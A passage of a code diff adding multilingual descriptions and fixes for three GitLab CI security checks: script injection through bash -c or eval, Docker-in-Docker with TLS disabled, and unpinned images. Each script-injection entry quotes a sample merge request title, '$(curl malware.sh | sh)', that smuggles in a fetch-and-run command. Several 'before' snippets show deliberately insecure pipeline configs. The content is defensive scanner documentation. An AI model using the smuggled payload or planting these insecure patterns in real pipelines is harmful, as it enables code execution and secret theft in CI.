@@ -561,6 +561,38 @@ export const checkTranslations: Partial<Record<TranslatedCheckLang, Record<strin
         after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
       },
     },
+    "gitlab-ci-script-injection": {
+      title: 'A value controlled by an external user passes through a second shell in the GitLab CI pipeline',
+      description: 'A "script:" line (or "before_script:"/"after_script:") uses "eval" or "sh -c"/"bash -c" together with a predefined GitLab variable such as the merge request title, the commit message, or the branch name — all writable by anyone who opens a merge request, even from an external fork. The value gets expanded once by the outer shell and then pasted into a string that the second shell parses again as code: a title like "$(curl malware.sh | sh)" would run arbitrary commands in the pipeline, with access to every secret available in that job.',
+      fix: {
+        before: `script:
+  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
+        after: `script:
+  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # passed as an argument to the command, never inside a "bash -c" string that would re-parse it`,
+      },
+    },
+    "gitlab-ci-privileged-dind-no-tls": {
+      title: 'Docker-in-Docker in the GitLab CI pipeline runs with TLS encryption disabled',
+      description: 'The job uses the "docker:dind" service (Docker-in-Docker, needed to build images inside the pipeline) but sets "DOCKER_TLS_CERTDIR" to an empty string, disabling TLS encryption between the Docker client and the dind daemon entirely. Without TLS, anyone who can reach that port on the runner\'s internal network can control the Docker daemon — which runs with extended privileges — instead of being limited to the job that\'s meant to use it.',
+      fix: {
+        before: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: ""`,
+        after: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: "/certs"  # TLS stays on between the Docker client and the dind daemon — "" disables it entirely`,
+      },
+    },
+    "gitlab-ci-unpinned-image": {
+      title: 'The GitLab CI pipeline\'s Docker image isn\'t pinned to a specific version',
+      description: 'An "image:" in the pipeline points to an image with no tag (which defaults to ":latest") or explicitly to ":latest". Whoever maintains that image can replace its contents at any time without the repository changing — the same pipeline can start running different code from one day to the next, a supply-chain risk conceptually identical to a GitHub Action referenced by tag instead of by commit.',
+      fix: {
+        before: `image: node:latest`,
+        after: `image: node:20.11.1  # a specific tag (or even better a digest "node@sha256:...") instead of "latest"`,
+      },
+    },
   },
   es: {
   "supabase-service-role-in-client": {
@@ -1070,6 +1102,38 @@ export const checkTranslations: Partial<Record<TranslatedCheckLang, Record<strin
       ),
     },
   }),
+    "gitlab-ci-script-injection": {
+      title: 'Un valor controlado por un usuario externo pasa por una segunda shell en el pipeline de GitLab CI',
+      description: 'Una línea de "script:" (o "before_script:"/"after_script:") usa "eval" o "sh -c"/"bash -c" junto con una variable predefinida de GitLab como el título de la merge request, el mensaje de commit o el nombre de la rama — todas modificables por cualquiera que abra una merge request, incluso desde un fork externo. El valor se expande una primera vez en la shell externa y luego se pega dentro de una cadena que la segunda shell interpreta de nuevo como código: un título como "$(curl malware.sh | sh)" ejecutaría comandos arbitrarios en el pipeline, con acceso a todos los secretos disponibles en ese job.',
+      fix: {
+        before: `script:
+  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
+        after: `script:
+  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # pasado como argumento al comando, nunca dentro de una cadena "bash -c" que lo reinterpretaría`,
+      },
+    },
+    "gitlab-ci-privileged-dind-no-tls": {
+      title: 'Docker-in-Docker en el pipeline de GitLab CI corre con el cifrado TLS desactivado',
+      description: 'El job usa el servicio "docker:dind" (Docker-in-Docker, necesario para construir imágenes dentro del pipeline) pero pone "DOCKER_TLS_CERTDIR" en una cadena vacía, desactivando por completo el cifrado TLS entre el cliente Docker y el demonio dind. Sin TLS, cualquiera que pueda alcanzar ese puerto en la misma red interna del runner puede controlar el demonio Docker — que corre con privilegios extendidos — en vez de limitarse al job que debería usarlo.',
+      fix: {
+        before: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: ""`,
+        after: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: "/certs"  # TLS activo entre el cliente Docker y el demonio dind — "" lo desactiva por completo`,
+      },
+    },
+    "gitlab-ci-unpinned-image": {
+      title: 'La imagen Docker del pipeline de GitLab CI no está fijada a una versión concreta',
+      description: 'Un "image:" del pipeline apunta a una imagen sin etiqueta (equivale a ":latest") o explícitamente a ":latest". Quien mantiene esa imagen puede reemplazar su contenido en cualquier momento sin que el repositorio cambie — el mismo pipeline puede empezar a usar código distinto de un día para otro, un riesgo de cadena de suministro conceptualmente idéntico a una GitHub Action referenciada por etiqueta en vez de por commit.',
+      fix: {
+        before: `image: node:latest`,
+        after: `image: node:20.11.1  # una etiqueta concreta (o mejor aún un digest "node@sha256:...") en vez de "latest"`,
+      },
+    },
 },
   fr: {
   "supabase-service-role-in-client": {
@@ -1578,6 +1642,38 @@ export const checkTranslations: Partial<Record<TranslatedCheckLang, Record<strin
       ),
     },
   }),
+    "gitlab-ci-script-injection": {
+      title: 'Une valeur contrôlée par un utilisateur externe passe par un second shell dans le pipeline GitLab CI',
+      description: 'Une ligne "script:" (ou "before_script:"/"after_script:") utilise "eval" ou "sh -c"/"bash -c" avec une variable prédéfinie de GitLab comme le titre de la merge request, le message de commit ou le nom de la branche — toutes modifiables par quiconque ouvre une merge request, même depuis un fork externe. La valeur est d\'abord développée par le shell externe, puis collée dans une chaîne que le second shell interprète à nouveau comme du code : un titre du type "$(curl malware.sh | sh)" exécuterait des commandes arbitraires dans le pipeline, avec accès à tous les secrets disponibles dans ce job.',
+      fix: {
+        before: `script:
+  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
+        after: `script:
+  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # passé comme argument à la commande, jamais dans une chaîne "bash -c" qui le réinterpréterait`,
+      },
+    },
+    "gitlab-ci-privileged-dind-no-tls": {
+      title: 'Docker-in-Docker dans le pipeline GitLab CI tourne avec le chiffrement TLS désactivé',
+      description: 'Le job utilise le service "docker:dind" (Docker-in-Docker, nécessaire pour construire des images dans le pipeline) mais définit "DOCKER_TLS_CERTDIR" sur une chaîne vide, désactivant entièrement le chiffrement TLS entre le client Docker et le démon dind. Sans TLS, quiconque peut atteindre ce port sur le même réseau interne du runner peut contrôler le démon Docker — qui tourne avec des privilèges étendus — au lieu de se limiter au job censé l\'utiliser.',
+      fix: {
+        before: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: ""`,
+        after: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: "/certs"  # TLS actif entre le client Docker et le démon dind — "" le désactive entièrement`,
+      },
+    },
+    "gitlab-ci-unpinned-image": {
+      title: 'L\'image Docker du pipeline GitLab CI n\'est pas figée à une version précise',
+      description: 'Un "image:" du pipeline pointe vers une image sans tag (équivalent à ":latest") ou explicitement vers ":latest". Quiconque maintient cette image peut en remplacer le contenu à tout moment sans que le dépôt ne change — le même pipeline peut se mettre à exécuter un code différent du jour au lendemain, un risque de supply chain conceptuellement identique à une GitHub Action référencée par tag plutôt que par commit.',
+      fix: {
+        before: `image: node:latest`,
+        after: `image: node:20.11.1  # un tag précis (ou mieux encore un digest "node@sha256:...") plutôt que "latest"`,
+      },
+    },
 },
   pt: {
   "supabase-service-role-in-client": {
@@ -2086,6 +2182,38 @@ export const checkTranslations: Partial<Record<TranslatedCheckLang, Record<strin
       after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<expected hash>  /tmp/install.sh" | sha256sum -c -`,
     },
   },
+    "gitlab-ci-script-injection": {
+      title: 'Um valor controlado por um utilizador externo passa por uma segunda shell no pipeline do GitLab CI',
+      description: 'Uma linha de "script:" (ou "before_script:"/"after_script:") usa "eval" ou "sh -c"/"bash -c" junto com uma variável predefinida do GitLab como o título da merge request, a mensagem de commit ou o nome do branch — todas editáveis por quem abrir uma merge request, mesmo a partir de um fork externo. O valor é expandido uma primeira vez pela shell externa e depois colado dentro de uma string que a segunda shell interpreta de novo como código: um título como "$(curl malware.sh | sh)" executaria comandos arbitrários no pipeline, com acesso a todos os segredos disponíveis nesse job.',
+      fix: {
+        before: `script:
+  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
+        after: `script:
+  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # passado como argumento ao comando, nunca dentro de uma string "bash -c" que o reinterpretaria`,
+      },
+    },
+    "gitlab-ci-privileged-dind-no-tls": {
+      title: 'Docker-in-Docker no pipeline do GitLab CI corre com a cifragem TLS desativada',
+      description: 'O job usa o serviço "docker:dind" (Docker-in-Docker, necessário para construir imagens dentro do pipeline) mas define "DOCKER_TLS_CERTDIR" como uma string vazia, desativando por completo a cifragem TLS entre o cliente Docker e o daemon dind. Sem TLS, quem conseguir alcançar essa porta na mesma rede interna do runner pode controlar o daemon Docker — que corre com privilégios alargados — em vez de ficar limitado ao job que o deveria usar.',
+      fix: {
+        before: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: ""`,
+        after: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: "/certs"  # TLS ativo entre o cliente Docker e o daemon dind — "" desativa-o por completo`,
+      },
+    },
+    "gitlab-ci-unpinned-image": {
+      title: 'A imagem Docker do pipeline do GitLab CI não está fixada numa versão precisa',
+      description: 'Um "image:" do pipeline aponta para uma imagem sem tag (equivale a ":latest") ou explicitamente a ":latest". Quem mantém essa imagem pode substituir o seu conteúdo a qualquer momento sem que o repositório mude — o mesmo pipeline pode passar a usar código diferente de um dia para o outro, um risco de supply chain conceptualmente idêntico a uma GitHub Action referenciada por tag em vez de por commit.',
+      fix: {
+        before: `image: node:latest`,
+        after: `image: node:20.11.1  # uma tag específica (ou melhor ainda um digest "node@sha256:...") em vez de "latest"`,
+      },
+    },
 },
   zh: {
   "supabase-service-role-in-client": {
@@ -2594,6 +2722,38 @@ export const checkTranslations: Partial<Record<TranslatedCheckLang, Record<strin
       after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<expected hash>  /tmp/install.sh" | sha256sum -c -`,
     },
   },
+    "gitlab-ci-script-injection": {
+      title: '外部用户可控的值在 GitLab CI 流水线中经过了第二层 shell',
+      description: '一行 "script:"（或 "before_script:"/"after_script:"）同时使用了 "eval" 或 "sh -c"/"bash -c" 与一个 GitLab 预定义变量，例如合并请求标题、提交信息或分支名 —— 这些内容任何人只要打开一个合并请求（即使来自外部 fork）都能写入。该值先被外层 shell 展开一次，然后被拼接进一个字符串，由第二层 shell 再次作为代码解析：像 "$(curl malware.sh | sh)" 这样的标题会在流水线中执行任意命令，并能访问该任务可用的所有密钥。',
+      fix: {
+        before: `script:
+  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
+        after: `script:
+  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # 作为参数传给命令，而不是放进会被重新解析的 "bash -c" 字符串里`,
+      },
+    },
+    "gitlab-ci-privileged-dind-no-tls": {
+      title: 'GitLab CI 流水线中的 Docker-in-Docker 禁用了 TLS 加密',
+      description: '该任务使用了 "docker:dind" 服务（Docker-in-Docker，用于在流水线中构建镜像），但将 "DOCKER_TLS_CERTDIR" 设为空字符串，完全禁用了 Docker 客户端与 dind 守护进程之间的 TLS 加密。没有 TLS 的情况下，任何能访问 runner 内部网络上该端口的人都能控制这个拥有扩展权限的 Docker 守护进程，而不仅限于本该使用它的任务。',
+      fix: {
+        before: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: ""`,
+        after: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: "/certs"  # 保持 Docker 客户端与 dind 守护进程之间的 TLS 加密 —— ""会完全禁用它`,
+      },
+    },
+    "gitlab-ci-unpinned-image": {
+      title: 'GitLab CI 流水线的 Docker 镜像没有固定到具体版本',
+      description: '流水线中的 "image:" 指向一个没有标签的镜像（等同于 ":latest"）或明确使用了 ":latest"。维护该镜像的人可以随时替换其内容而无需改动仓库 —— 同一条流水线可能在某天突然开始运行不同的代码，这种供应链风险在概念上等同于用标签而非提交引用的 GitHub Action。',
+      fix: {
+        before: `image: node:latest`,
+        after: `image: node:20.11.1  # 使用具体标签（或者更好地使用摘要 "node@sha256:..."）而不是 "latest"`,
+      },
+    },
 },
   hi: {
   "supabase-service-role-in-client": {
@@ -3102,6 +3262,38 @@ export const checkTranslations: Partial<Record<TranslatedCheckLang, Record<strin
       after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<expected hash>  /tmp/install.sh" | sha256sum -c -`,
     },
   },
+    "gitlab-ci-script-injection": {
+      title: 'GitLab CI पाइपलाइन में एक बाहरी उपयोगकर्ता द्वारा नियंत्रित वैल्यू दूसरी शेल से गुज़रती है',
+      description: 'एक "script:" लाइन (या "before_script:"/"after_script:") "eval" या "sh -c"/"bash -c" का उपयोग किसी GitLab प्रीडिफ़ाइंड वेरिएबल जैसे मर्ज रिक्वेस्ट टाइटल, कमिट मैसेज या ब्रांच नाम के साथ करती है — ये सभी कोई भी मर्ज रिक्वेस्ट खोलकर लिख सकता है, यहां तक कि बाहरी फोर्क से भी। वैल्यू पहले बाहरी शेल द्वारा एक्सपैंड होती है, फिर एक ऐसी स्ट्रिंग में चिपका दी जाती है जिसे दूसरी शेल फिर से कोड के रूप में पढ़ती है: "$(curl malware.sh | sh)" जैसा टाइटल पाइपलाइन में मनमाने कमांड चला देगा, उस जॉब में उपलब्ध सभी सीक्रेट्स तक पहुंच के साथ।',
+      fix: {
+        before: `script:
+  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
+        after: `script:
+  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # कमांड को आर्गुमेंट के रूप में दिया गया, कभी भी "bash -c" स्ट्रिंग के अंदर नहीं जो इसे फिर से पढ़ ले`,
+      },
+    },
+    "gitlab-ci-privileged-dind-no-tls": {
+      title: 'GitLab CI पाइपलाइन में Docker-in-Docker TLS एन्क्रिप्शन बंद करके चल रहा है',
+      description: 'जॉब "docker:dind" सर्विस (Docker-in-Docker, पाइपलाइन के अंदर इमेज बनाने के लिए ज़रूरी) का उपयोग करता है लेकिन "DOCKER_TLS_CERTDIR" को खाली स्ट्रिंग पर सेट करता है, जिससे Docker क्लाइंट और dind डीमन के बीच TLS एन्क्रिप्शन पूरी तरह बंद हो जाता है। TLS के बिना, runner के उसी इंटरनल नेटवर्क पर उस पोर्ट तक पहुंचने वाला कोई भी व्यक्ति — उस जॉब तक सीमित रहने के बजाय — विस्तारित विशेषाधिकारों वाले Docker डीमन को नियंत्रित कर सकता है।',
+      fix: {
+        before: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: ""`,
+        after: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: "/certs"  # Docker क्लाइंट और dind डीमन के बीच TLS चालू रहता है — "" इसे पूरी तरह बंद कर देता है`,
+      },
+    },
+    "gitlab-ci-unpinned-image": {
+      title: 'GitLab CI पाइपलाइन की Docker इमेज किसी निश्चित वर्शन पर फिक्स नहीं है',
+      description: 'पाइपलाइन का "image:" बिना टैग वाली इमेज (जो ":latest" के बराबर है) या सीधे ":latest" की ओर इशारा करता है। उस इमेज को मेंटेन करने वाला कभी भी इसकी सामग्री बदल सकता है बिना रिपॉज़िटरी बदले — वही पाइपलाइन एक दिन से दूसरे दिन अलग कोड चलाना शुरू कर सकती है, जो कमिट के बजाय टैग से रेफ़र की गई GitHub Action जैसा ही सप्लाई चेन जोखिम है।',
+      fix: {
+        before: `image: node:latest`,
+        after: `image: node:20.11.1  # "latest" के बजाय एक निश्चित टैग (या इससे भी बेहतर एक डाइजेस्ट "node@sha256:...")`,
+      },
+    },
 },
   ru: {
   "supabase-service-role-in-client": {
@@ -3610,6 +3802,38 @@ export const checkTranslations: Partial<Record<TranslatedCheckLang, Record<strin
       after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
     },
   },
+    "gitlab-ci-script-injection": {
+      title: 'Значение, контролируемое внешним пользователем, проходит через вторую оболочку в пайплайне GitLab CI',
+      description: 'Строка "script:" (или "before_script:"/"after_script:") использует "eval" или "sh -c"/"bash -c" вместе с предопределённой переменной GitLab, такой как заголовок merge request, сообщение коммита или имя ветки — всё это может написать любой, кто открывает merge request, даже из внешнего форка. Значение сначала разворачивается внешней оболочкой, а затем вставляется в строку, которую вторая оболочка снова интерпретирует как код: заголовок вида "$(curl malware.sh | sh)" выполнил бы произвольные команды в пайплайне с доступом ко всем секретам, доступным в этой задаче.',
+      fix: {
+        before: `script:
+  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
+        after: `script:
+  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # передано как аргумент команде, а не внутри строки "bash -c", которая бы его переинтерпретировала`,
+      },
+    },
+    "gitlab-ci-privileged-dind-no-tls": {
+      title: 'Docker-in-Docker в пайплайне GitLab CI работает с отключённым TLS-шифрованием',
+      description: 'Задача использует сервис "docker:dind" (Docker-in-Docker, нужен для сборки образов внутри пайплайна), но задаёт "DOCKER_TLS_CERTDIR" как пустую строку, полностью отключая TLS-шифрование между клиентом Docker и демоном dind. Без TLS любой, кто может достучаться до этого порта в той же внутренней сети раннера, может управлять демоном Docker — который работает с расширенными привилегиями — вместо того чтобы быть ограниченным только той задачей, которая должна его использовать.',
+      fix: {
+        before: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: ""`,
+        after: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: "/certs"  # TLS остаётся включённым между клиентом Docker и демоном dind — "" полностью его отключает`,
+      },
+    },
+    "gitlab-ci-unpinned-image": {
+      title: 'Docker-образ пайплайна GitLab CI не закреплён за конкретной версией',
+      description: '"image:" пайплайна указывает на образ без тега (что равносильно ":latest") либо явно на ":latest". Тот, кто поддерживает этот образ, может заменить его содержимое в любой момент без изменений в репозитории — один и тот же пайплайн может в один день начать выполнять другой код, что концептуально тот же риск цепочки поставок, что и у GitHub Action, указанного по тегу, а не по коммиту.',
+      fix: {
+        before: `image: node:latest`,
+        after: `image: node:20.11.1  # конкретный тег (или ещё лучше дайджест "node@sha256:...") вместо "latest"`,
+      },
+    },
 },
   ar: {
   "supabase-service-role-in-client": {
@@ -4118,6 +4342,38 @@ export const checkTranslations: Partial<Record<TranslatedCheckLang, Record<strin
       after: `spec:\n  hostNetwork: false`,
     },
   },
+    "gitlab-ci-script-injection": {
+      title: 'قيمة يتحكم بها مستخدم خارجي تمر عبر غلاف صَدَفي ثانٍ في خط أنابيب GitLab CI',
+      description: 'يستخدم سطر "script:" (أو "before_script:"/"after_script:") أمر "eval" أو "sh -c"/"bash -c" مع متغيّر محدد مسبقًا من GitLab مثل عنوان طلب الدمج، أو رسالة الالتزام، أو اسم الفرع — وكلها قابلة للكتابة من قِبل أي شخص يفتح طلب دمج، حتى من نسخة خارجية (fork). تُوسَّع القيمة أولًا بواسطة الصَدَفة الخارجية ثم تُلصق داخل سلسلة نصية تفسرها الصَدَفة الثانية مرة أخرى كشيفرة: عنوان مثل "$(curl malware.sh | sh)" سيُنفّذ أوامر عشوائية في خط الأنابيب، مع وصول إلى كل الأسرار المتاحة في تلك المهمة.',
+      fix: {
+        before: `script:
+  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
+        after: `script:
+  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # يُمرَّر كوسيطة للأمر، أبدًا داخل سلسلة "bash -c" التي قد تعيد تفسيره`,
+      },
+    },
+    "gitlab-ci-privileged-dind-no-tls": {
+      title: 'Docker-in-Docker في خط أنابيب GitLab CI يعمل بتشفير TLS معطّل',
+      description: 'تستخدم المهمة خدمة "docker:dind" (Docker-in-Docker، ضرورية لبناء الصور داخل خط الأنابيب) لكنها تضبط "DOCKER_TLS_CERTDIR" على سلسلة نصية فارغة، مما يعطّل تمامًا تشفير TLS بين عميل Docker وخادم dind. بدون TLS، يمكن لأي شخص يصل إلى تلك المنفذ على نفس الشبكة الداخلية للـ runner أن يتحكم في خادم Docker — الذي يعمل بصلاحيات موسّعة — بدلًا من أن يقتصر على المهمة التي يُفترض أن تستخدمه.',
+      fix: {
+        before: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: ""`,
+        after: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: "/certs"  # يبقى TLS مفعّلًا بين عميل Docker وخادم dind — "" يعطّله تمامًا`,
+      },
+    },
+    "gitlab-ci-unpinned-image": {
+      title: 'صورة Docker لخط أنابيب GitLab CI غير مثبّتة على إصدار محدد',
+      description: 'يشير "image:" في خط الأنابيب إلى صورة بلا وسم (يعادل ":latest") أو صراحة إلى ":latest". يمكن لمن يصون تلك الصورة استبدال محتواها في أي وقت دون أن يتغيّر المستودع — يمكن لنفس خط الأنابيب أن يبدأ بتشغيل شيفرة مختلفة من يوم لآخر، وهو خطر سلسلة توريد مطابق من حيث المبدأ لإجراء GitHub مُشار إليه بوسم بدلاً من التزام.',
+      fix: {
+        before: `image: node:latest`,
+        after: `image: node:20.11.1  # وسم محدد (أو أفضل من ذلك ملخّص "node@sha256:...") بدلاً من "latest"`,
+      },
+    },
 },
   bn: {
   "supabase-service-role-in-client": {
@@ -4626,6 +4882,38 @@ export const checkTranslations: Partial<Record<TranslatedCheckLang, Record<strin
       ),
     },
   }),
+    "gitlab-ci-script-injection": {
+      title: 'GitLab CI পাইপলাইনে একটি বাহ্যিক ব্যবহারকারীর নিয়ন্ত্রিত মান দ্বিতীয় শেলের মধ্য দিয়ে যায়',
+      description: 'একটি "script:" লাইন (বা "before_script:"/"after_script:") "eval" বা "sh -c"/"bash -c" ব্যবহার করে একটি GitLab প্রিডিফাইন্ড ভেরিয়েবলের সাথে, যেমন মার্জ রিকোয়েস্টের শিরোনাম, কমিট মেসেজ বা ব্রাঞ্চের নাম — এগুলো যে কেউ মার্জ রিকোয়েস্ট খুলে লিখতে পারে, এমনকি একটি বাহ্যিক ফর্ক থেকেও। মানটি প্রথমে বাহ্যিক শেল দ্বারা এক্সপ্যান্ড হয়, তারপর এমন একটি স্ট্রিংয়ে বসানো হয় যা দ্বিতীয় শেল আবার কোড হিসেবে পড়ে: "$(curl malware.sh | sh)" এর মতো একটি শিরোনাম পাইপলাইনে যেকোনো কমান্ড চালিয়ে দেবে, সেই জবে উপলব্ধ সব সিক্রেটের অ্যাক্সেস সহ।',
+      fix: {
+        before: `script:
+  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
+        after: `script:
+  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # কমান্ডের আর্গুমেন্ট হিসেবে পাঠানো হয়েছে, কখনোই "bash -c" স্ট্রিংয়ের ভেতরে নয় যা এটি আবার পার্স করবে`,
+      },
+    },
+    "gitlab-ci-privileged-dind-no-tls": {
+      title: 'GitLab CI পাইপলাইনে Docker-in-Docker TLS এনক্রিপশন বন্ধ রেখে চলছে',
+      description: 'জবটি "docker:dind" সার্ভিস (Docker-in-Docker, পাইপলাইনের ভেতরে ইমেজ তৈরি করতে প্রয়োজনীয়) ব্যবহার করে কিন্তু "DOCKER_TLS_CERTDIR" একটি খালি স্ট্রিং-এ সেট করে, যা Docker ক্লায়েন্ট ও dind ডিমনের মধ্যে TLS এনক্রিপশন সম্পূর্ণ বন্ধ করে দেয়। TLS ছাড়া, রানারের একই অভ্যন্তরীণ নেটওয়ার্কে সেই পোর্টে পৌঁছাতে পারে এমন যে কেউ — শুধু সেই জবে সীমাবদ্ধ না থেকে — বর্ধিত সুবিধাসহ চলা Docker ডিমনকে নিয়ন্ত্রণ করতে পারে।',
+      fix: {
+        before: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: ""`,
+        after: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: "/certs"  # Docker ক্লায়েন্ট ও dind ডিমনের মধ্যে TLS চালু থাকে — "" এটি সম্পূর্ণ বন্ধ করে দেয়`,
+      },
+    },
+    "gitlab-ci-unpinned-image": {
+      title: 'GitLab CI পাইপলাইনের Docker ইমেজ কোনো নির্দিষ্ট ভার্সনে ফিক্সড নয়',
+      description: 'পাইপলাইনের "image:" কোনো ট্যাগ ছাড়া ইমেজের দিকে নির্দেশ করে (যা ":latest" এর সমতুল্য) অথবা স্পষ্টভাবে ":latest" এর দিকে। যে এই ইমেজ মেইনটেইন করে সে যেকোনো সময় রিপোজিটরি পরিবর্তন না করেই এর কন্টেন্ট বদলে দিতে পারে — একই পাইপলাইন এক দিন থেকে পরের দিন ভিন্ন কোড চালানো শুরু করতে পারে, যা কমিটের বদলে ট্যাগ দিয়ে রেফারেন্স করা GitHub Action-এর মতোই একটি সাপ্লাই চেইন ঝুঁকি।',
+      fix: {
+        before: `image: node:latest`,
+        after: `image: node:20.11.1  # "latest" এর বদলে একটি নির্দিষ্ট ট্যাগ (বা আরও ভালো একটি ডাইজেস্ট "node@sha256:...")`,
+      },
+    },
 },
   ur: {
   "supabase-service-role-in-client": {
@@ -5134,6 +5422,38 @@ export const checkTranslations: Partial<Record<TranslatedCheckLang, Record<strin
       ),
     },
   }),
+    "gitlab-ci-script-injection": {
+      title: 'GitLab CI پائپ لائن میں ایک بیرونی صارف کی کنٹرول کردہ ویلیو دوسرے شیل سے گزرتی ہے',
+      description: 'ایک "script:" لائن (یا "before_script:"/"after_script:") "eval" یا "sh -c"/"bash -c" کو GitLab کے پہلے سے طے شدہ ویری ایبل کے ساتھ استعمال کرتی ہے جیسے مرج ریکویسٹ کا عنوان، کمٹ میسج، یا برانچ کا نام — یہ سب کوئی بھی مرج ریکویسٹ کھول کر لکھ سکتا ہے، یہاں تک کہ بیرونی فورک سے بھی۔ ویلیو پہلے بیرونی شیل کے ذریعے پھیلائی جاتی ہے، پھر ایک ایسی سٹرنگ میں چسپاں کی جاتی ہے جسے دوسری شیل دوبارہ کوڈ کے طور پر پڑھتی ہے: "$(curl malware.sh | sh)" جیسا عنوان پائپ لائن میں من مانے کمانڈز چلا دے گا، اس جاب میں دستیاب تمام سیکریٹس تک رسائی کے ساتھ۔',
+      fix: {
+        before: `script:
+  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
+        after: `script:
+  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # کمانڈ کو آرگیومنٹ کے طور پر دیا گیا، کبھی بھی "bash -c" سٹرنگ کے اندر نہیں جو اسے دوبارہ پارس کرے`,
+      },
+    },
+    "gitlab-ci-privileged-dind-no-tls": {
+      title: 'GitLab CI پائپ لائن میں Docker-in-Docker TLS انکرپشن بند کر کے چل رہا ہے',
+      description: 'جاب "docker:dind" سروس (Docker-in-Docker، پائپ لائن کے اندر امیجز بنانے کے لیے ضروری) استعمال کرتا ہے لیکن "DOCKER_TLS_CERTDIR" کو خالی سٹرنگ پر سیٹ کرتا ہے، جس سے Docker کلائنٹ اور dind ڈیمن کے درمیان TLS انکرپشن مکمل طور پر بند ہو جاتا ہے۔ TLS کے بغیر، رنر کے اسی اندرونی نیٹ ورک پر اس پورٹ تک رسائی رکھنے والا کوئی بھی شخص — صرف اس جاب تک محدود رہنے کے بجائے — وسیع اختیارات کے ساتھ چلنے والے Docker ڈیمن کو کنٹرول کر سکتا ہے۔',
+      fix: {
+        before: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: ""`,
+        after: `services:
+  - docker:dind
+variables:
+  DOCKER_TLS_CERTDIR: "/certs"  # Docker کلائنٹ اور dind ڈیمن کے درمیان TLS فعال رہتا ہے — "" اسے مکمل طور پر بند کر دیتا ہے`,
+      },
+    },
+    "gitlab-ci-unpinned-image": {
+      title: 'GitLab CI پائپ لائن کی Docker امیج کسی مخصوص ورژن پر فکس نہیں ہے',
+      description: 'پائپ لائن کا "image:" بغیر ٹیگ والی امیج کی طرف اشارہ کرتا ہے (جو ":latest" کے برابر ہے) یا واضح طور پر ":latest" کی طرف۔ جو اس امیج کو مینٹین کرتا ہے وہ کسی بھی وقت اس کا مواد بدل سکتا ہے بغیر ریپوزیٹری بدلے — وہی پائپ لائن ایک دن سے دوسرے دن مختلف کوڈ چلانا شروع کر سکتی ہے، جو کمٹ کے بجائے ٹیگ سے حوالہ دی گئی GitHub Action جیسا ہی سپلائی چین رسک ہے۔',
+      fix: {
+        before: `image: node:latest`,
+        after: `image: node:20.11.1  # "latest" کے بجائے ایک مخصوص ٹیگ (یا اس سے بھی بہتر ایک ڈائجسٹ "node@sha256:...")`,
+      },
+    },
 },
   id: {
   "supabase-service-role-in-client": {
@@ -5642,6 +5962,38 @@ export const checkTranslations: Partial<Record<TranslatedCheckLang, Record<strin
       after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<hash yang diharapkan>  /tmp/install.sh" | sha256sum -c -`,
     },
   },
+    "gitlab-ci-script-injection": {
+      title: 'Nilai yang dikendalikan pengguna eksternal melewati shell kedua dalam pipeline GitLab CI',
+      description: 'Baris "script:" (atau "before_script:"/"after_script:") menggunakan "eval" atau "sh -c"/"bash -c" bersama variabel bawaan GitLab seperti judul merge request, pesan commit, atau nama branch — semuanya bisa ditulis oleh siapa saja yang membuka merge request, bahkan dari fork eksternal. Nilainya di-expand sekali oleh shell luar lalu ditempelkan ke dalam string yang diinterpretasikan ulang sebagai kode oleh shell kedua: judul seperti "$(curl malware.sh | sh)" akan menjalankan perintah apa pun di pipeline, dengan akses ke semua secret yang tersedia di job tersebut.',
+      fix: {
+        before: `script:
+  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
+        after: `script:
